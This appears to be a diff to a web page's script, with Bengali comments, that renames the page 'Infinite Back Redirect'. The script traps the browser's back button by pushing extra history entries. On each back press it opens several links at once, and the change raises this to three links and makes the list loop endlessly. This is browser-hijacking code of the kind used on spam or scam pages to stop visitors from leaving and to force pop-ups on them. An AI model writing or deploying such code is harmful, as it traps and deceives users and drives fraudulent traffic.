@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unescapable Redirect Chain</title>
+  <title>Infinite Back Redirect</title>
 </head>
 <body>
 <script>
@@ -29,25 +29,27 @@
     }
   }
 
-  function multiRedirect(count = 2) {
-    for (let j = 0; j < count && index < LINKS.length; j++, index++) {
+  function multiRedirect(count = 3) {
+    for (let j = 0; j < count; j++) {
+      if (index >= LINKS.length) index = 0; // শেষ হলে আবার প্রথম থেকে শুরু
       openStrong(LINKS[index]);
+      index++;
     }
   }
 
-  // --- BACK BUTTON LOCK SYSTEM ---
+  // --- BACK BUTTON LOCK ---
   function lockHistory() {
     history.pushState(null, null, location.href);
     history.pushState(null, null, location.href);
   }
 
-  // প্রথমবার ঢুকলে lock
+  // প্রথমবার lock
   lockHistory();
 
-  // back চাপলেই redirect হবে + আবার lock হবে
+  // প্রতি back এ infinite redirect
   window.addEventListener("popstate", function () {
-    lockHistory();
-    multiRedirect(2); // প্রতি back এ 2টা লিংক একসাথে ওপেন
+    lockHistory();       // আবার lock করো
+    multiRedirect(3);    // একসাথে ৩টা লিংক ওপেন
   });
 
 })();
